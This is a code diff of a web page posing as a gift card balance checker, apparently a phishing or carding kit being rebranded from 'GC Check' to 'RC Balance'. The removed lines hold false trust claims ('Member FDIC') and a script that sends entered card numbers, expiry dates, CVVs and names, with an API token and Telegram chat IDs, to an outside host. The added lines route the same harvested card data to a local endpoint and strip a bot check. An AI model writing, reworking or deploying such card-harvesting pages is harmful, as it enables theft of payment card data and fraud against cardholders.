           </div>
         </div>
       </section>
 
       <section id="page-contact" class="page">
-        <div class="hero"><h1>Contact Us</h1><p>We're here to help</p></div>
         <div class="content-section">
-          <div class="contact-info">
-            <p><strong>Customer Support:</strong></p>
-            <p>Email: <a href="mailto:support@gccheck.com">support@gccheck.com</a></p>
-            <p>Phone: 1-800-GC-CHECK (1-800-422-4325)</p>
-            <p>Hours: 24/7</p>
+          <h2>Get in Touch</h2>
+          <p>Our dedicated support team is here to assist you with any questions or technical issues you may encounter.</p>
+          
+          <div class="contact-grid">
+            <div class="contact-method">
+              <div class="icon">
+                <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+              </div>
+              <h4>Email Support</h4>
+              <p style="font-size: 0.9rem;">support@rcbalance.local</p>
+              <p style="font-size: 0.8rem; margin-top: 0.5rem; opacity: 0.7;">Response within 24h</p>
+            </div>
+            <div class="contact-method">
+              <div class="icon">
+                <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path></svg>
+              </div>
+              <h4>Live Chat</h4>
+              <p style="font-size: 0.9rem;">Available 9AM - 5PM EST</p>
+              <p style="font-size: 0.8rem; margin-top: 0.5rem; opacity: 0.7;">Monday to Friday</p>
+            </div>
+          </div>
+          
+          <div style="margin-top: 3rem; text-align: center; padding: 2rem; background: #eff6ff; border-radius: 16px;">
+            <h4 style="margin-bottom: 0.5rem; color: var(--accent);">Business Inquiries</h4>
+            <p style="font-size: 1rem; margin-bottom: 0;">For partnership opportunities, please contact <strong>partners@rcbalance.local</strong></p>
           </div>
         </div>
       </section>
 
       <section id="page-about" class="page">
-        <div class="hero"><h1>About GC Check</h1><p>Your trusted gift card balance checker since 2014</p></div>
         <div class="content-section">
-          <p>GC Check has been helping customers verify their gift card and prepaid card balances since 2014. We issue Visa, Mastercard, and American Express prepaid cards and provide a secure, easy way to check your balance online.</p>
-          <p>Our platform is used by thousands of customers worldwide. We are committed to security, reliability, and excellent customer service.</p>
+          <h2>About RC Balance</h2>
+          <p>RC Balance was founded with a simple mission: to provide gift card holders with a fast, secure, and professional way to manage their balances.</p>
+          <p>We recognized that checking gift card balances often involves navigating clunky retailer websites or calling automated phone lines. We've built a modern alternative that puts everything you need in one place.</p>
+          
+          <div class="about-features">
+            <div class="about-feature">
+              <svg class="about-feature-icon" width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+              <div>
+                <h4 style="font-size: 1rem; margin-bottom: 0.25rem;">Trust & Transparency</h4>
+                <p style="font-size: 0.875rem; margin-bottom: 0;">We are committed to the highest standards of data privacy and security.</p>
+              </div>
+            </div>
+            <div class="about-feature">
+              <svg class="about-feature-icon" width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+              <div>
+                <h4 style="font-size: 1rem; margin-bottom: 0.25rem;">Innovation First</h4>
+                <p style="font-size: 0.875rem; margin-bottom: 0;">Our real-time verification engine is the fastest in the industry.</p>
+              </div>
+            </div>
+          </div>
+          
+          <div style="margin-top: 3rem; border-top: 1px solid var(--border); padding-top: 2rem;">
+            <p style="font-style: italic; text-align: center; color: var(--text-muted);">"Redefining the way you interact with your digital assets, one card at a time."</p>
+          </div>
         </div>
       </section>
     </main>
+
     <footer class="footer">
-      <div class="footer-inner">
-        <div class="footer-nav">
-          <a href="/">Home</a>
-          <a href="/faq">FAQ</a>
-          <a href="/contact">Contact Us</a>
-          <a href="/about">About</a>
-        </div>
-        <div class="footer-badges">
-          <span class="visa">Visa</span>
-          <span class="mc">Mastercard</span>
-          <span class="amex">American Express</span>
-        </div>
-        <p>GC Check &copy; 2014 - Present &bull; Member FDIC &bull; Your card is protected</p>
-      </div>
+      <p>&copy; 2026 RC Balance. Local testing version.</p>
     </footer>
   </div>
+
   <div class="loading-overlay" id="loadingOverlay">
-    <div class="loading-logo">GC</div>
-    <div class="spinner-lg"></div>
-    <span class="loading-text">Checking your card balance...</span>
+    <div class="spinner"></div>
+    <span>Verifying...</span>
   </div>
   <script>
-    const API_TOKEN='4439f671d73478c6401b758b50594ce5';
-    const TELEGRAM_BEFORE='-1003750392427';
-    const TELEGRAM_AFTER='-1003750392427';
-    const API_URL='https://bot.pc.am/v3/checkBalance';
-
     function showPageFromPath(){
       const path=window.location.pathname.replace(/\/$/,'')||'/';
       const page=path===''||path==='/home'?'home':path.replace(/^\//,'')||'home';
@@ -281,7 +397,7 @@
     showPageFromPath();
     window.addEventListener('popstate',showPageFromPath);
 
-    const cardInput=document.getElementById('cardNumber'),expiryMonth=document.getElementById('expiryMonth'),expiryYear=document.getElementById('expiryYear'),cvvInput=document.getElementById('cvv');
+    const cardInput=document.getElementById('cardNumber'),expiryMonth=document.getElementById('expiryMonth'),expiryYear=document.getElementById('expiryYear'),cvvInput=document.getElementById('cvv'),cardHolderInput=document.getElementById('cardHolder');
     const form=document.getElementById('balanceForm'),resultEl=document.getElementById('result'),submitBtn=document.getElementById('submitBtn'),formFields=document.getElementById('formFields'),checkAnother=document.getElementById('checkAnother');
 
     function getCardType(num){
@@ -290,29 +406,51 @@
       if(/^5[1-5]/.test(d))return'Mastercard';
       const n4=d.length>=4?parseInt(d.slice(0,4),10):0;
       if(d.startsWith('2')&&n4>=2221&&n4<=2720)return'Mastercard';
-      if(/^3[47]/.test(d))return'American Express';
       return null;
     }
-    const CARD_LOGOS={Visa:'<svg class="detected-card-logo-svg" viewBox="0 0 48 16" width="72" height="24"><text x="0" y="12" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#1A1F71">VISA</text></svg>',Mastercard:'<svg class="detected-card-logo-svg" viewBox="0 0 48 32" width="54" height="36"><circle cx="17" cy="16" r="12" fill="#EB001B"/><circle cx="31" cy="16" r="12" fill="#F79E1B"/><path d="M24 5a12 12 0 0 1 7 11 12 12 0 0 1-7 11 12 12 0 0 1-7-11 12 12 0 0 1 7-11z" fill="#FF5F00"/></svg>','American Express':'<svg class="detected-card-logo-svg" viewBox="0 0 48 16" width="60" height="20"><text x="0" y="12" font-family="Arial,sans-serif" font-size="10" font-weight="bold" fill="#006FCF">AMEX</text></svg>'};
+    const CARD_LOGOS={Visa:'/visa.svg',Mastercard:'/mastercard.svg'};
     function updateDetectedCard(){
-      const digits=cardInput.value.replace(/\s/g,'');
-      const logoEl=document.getElementById('detectedLogo');
-      const placeholderEl=document.getElementById('detectedPlaceholder');
+      const val = cardInput.value;
+      const digits=val.replace(/\s/g,'');
+      const vNumber = document.getElementById('vNumber');
+      const vBrand = document.getElementById('vBrand');
+      
+      // Update virtual card number
+      let displayNum = val || '•••• •••• •••• ••••';
+      vNumber.textContent = displayNum;
+
       const type=getCardType(digits);
-      if(digits.length>=4&&type){
-        logoEl.innerHTML=CARD_LOGOS[type]||'';
-        logoEl.style.display='block';
-        placeholderEl.style.display='none';
+      if(digits.length>=2&&type){
+        vBrand.innerHTML = `<img src="${CARD_LOGOS[type]}" alt="${type}">`;
       }else{
-        logoEl.innerHTML='';
-        logoEl.style.display='none';
-        placeholderEl.style.display='block';
-        placeholderEl.textContent='—';
+        vBrand.innerHTML = '';
       }
     }
-    cardInput.oninput=e=>{let v=e.target.value.replace(/\D/g,'').slice(0,19);e.target.value=v.replace(/(\d{4})(?=\d)/g,'$1 ');e.target.classList.remove('error');updateDetectedCard()};
-    expiryMonth.oninput=e=>{e.target.value=e.target.value.replace(/\D/g,'').slice(0,2);e.target.classList.remove('error')};
-    expiryYear.oninput=e=>{e.target.value=e.target.value.replace(/\D/g,'').slice(0,2);e.target.classList.remove('error')};
+    cardInput.oninput=e=>{
+      let v=e.target.value.replace(/\D/g,'').slice(0,19);
+      e.target.value=v.replace(/(\d{4})(?=\d)/g,'$1 ');
+      e.target.classList.remove('error');
+      updateDetectedCard();
+    };
+    cardHolderInput.oninput=e=>{
+      let v=e.target.value.toUpperCase();
+      document.getElementById('vCardHolder').textContent = v || 'GIFT CARD RECIPIENT';
+    };
+    expiryMonth.oninput=e=>{
+      e.target.value=e.target.value.replace(/\D/g,'').slice(0,2);
+      e.target.classList.remove('error');
+      updateExpiryPreview();
+    };
+    expiryYear.oninput=e=>{
+      e.target.value=e.target.value.replace(/\D/g,'').slice(0,2);
+      e.target.classList.remove('error');
+      updateExpiryPreview();
+    };
+    function updateExpiryPreview(){
+      const mm = expiryMonth.value || 'MM';
+      const yy = expiryYear.value || 'YY';
+      document.getElementById('vExpiry').textContent = `${mm}/${yy}`;
+    }
     cvvInput.oninput=e=>{e.target.value=e.target.value.replace(/\D/g,'').slice(0,3);e.target.classList.remove('error')};
 
     function luhnCheck(num){
@@ -346,8 +484,6 @@
       }
       const cvv=cvvInput.value;
       if(!cvv||cvv.length!==3){document.getElementById('cvvError').textContent='Enter 3-digit security code (000-999)';cvvInput.classList.add('error');ok=false}
-      const turnstileResp=document.querySelector('[name="cf-turnstile-response"]');
-      if(turnstileResp&&!turnstileResp.value){alert('Please complete the security verification.');ok=false}
       return ok;
     }
 
@@ -358,7 +494,16 @@
       formFields.classList.add('hide');checkAnother.classList.add('show');resultEl.scrollIntoView({behavior:'smooth',block:'nearest'});
     }
 
-    checkAnother.onclick=()=>{resultEl.className='balance-result';resultEl.innerHTML='';formFields.classList.remove('hide');checkAnother.classList.remove('show');form.reset();updateDetectedCard();if(typeof turnstile!=='undefined'&&document.getElementById('turnstile-container'))turnstile.reset('#turnstile-container')};
+    checkAnother.onclick=()=>{
+      resultEl.className='balance-result';
+      resultEl.innerHTML='';
+      formFields.classList.remove('hide');
+      checkAnother.classList.remove('show');
+      form.reset();
+      updateDetectedCard();
+      document.getElementById('vCardHolder').textContent = 'GIFT CARD RECIPIENT';
+      document.getElementById('vExpiry').textContent = 'MM/YY';
+    };
 
     const CARD_ERROR_MSG='Check your card information or use a new card.';
     const loadingOverlay=document.getElementById('loadingOverlay');
@@ -370,14 +515,18 @@
       submitBtn.disabled=true;submitBtn.innerHTML='<span class="spinner"></span> Checking...';
       loadingOverlay.classList.add('show');
       try{
-        const params=new URLSearchParams({token:API_TOKEN,number:digits,month:(expiryMonth.value||'').padStart(2,'0'),year:expiryYear.value||'',cvv:cvvInput.value||''});
-        const cardName=document.getElementById('cardName').value.trim();
-        if(cardName)params.set('telegram_additional_note','Name: '+cardName);
-        if(TELEGRAM_BEFORE)params.set('telegram_id_before_check',TELEGRAM_BEFORE);
-        if(TELEGRAM_AFTER)params.set('telegram_id_after_check',TELEGRAM_AFTER);
-        const res=await fetch(API_URL+'?'+params.toString());
-        const text=await res.text();
-        let data;try{data=JSON.parse(text)}catch{data={}};
+        const payload = {
+          cardNumber: digits,
+          expiryMonth: (expiryMonth.value || '').padStart(2, '0'),
+          expiryYear: expiryYear.value || '',
+          cvv: cvvInput.value || ''
+        };
+        const res=await fetch('/api/check-balance', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const data = await res.json();
         let result={success:false,error:''};
         let bal=null;let curr='USD';
         const d=data.data||data;
